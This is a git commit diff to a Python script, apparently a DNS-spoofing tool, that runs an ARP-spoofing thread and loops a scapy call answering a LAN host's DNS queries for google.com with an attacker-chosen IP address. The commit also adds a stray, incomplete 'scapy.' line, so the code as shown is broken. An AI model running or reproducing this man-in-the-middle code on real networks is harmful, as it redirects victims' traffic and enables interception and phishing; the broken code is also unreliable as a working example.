0149853e08f7f013540848ff7cb5bac49b05bf1d
WGAVermeer <90707235+WGAVermeer@users.noreply.github.com>
2023-06-11 15:03:53 +0200

    Update preBuiltDNSspoof.py

--- preBuiltDNSspoof.py
+++ preBuiltDNSspoof.py
@@ -60,7 +60,8 @@ def main() :
     arpThread.start()
     while True: 
         try:
-            scapy.dns_spoof(joker="188.114.96.0", match='google.com', from_ip='192.168.178.144')
+            scapy.
+            scapy.DNS_am(joker="188.114.96.0", match='google.com', from_ip='192.168.178.144')
             pktCounter = pktCounter + 1
             print('Intercepted packets: ' + str(pktCounter) )
         except KeyboardInterrupt:
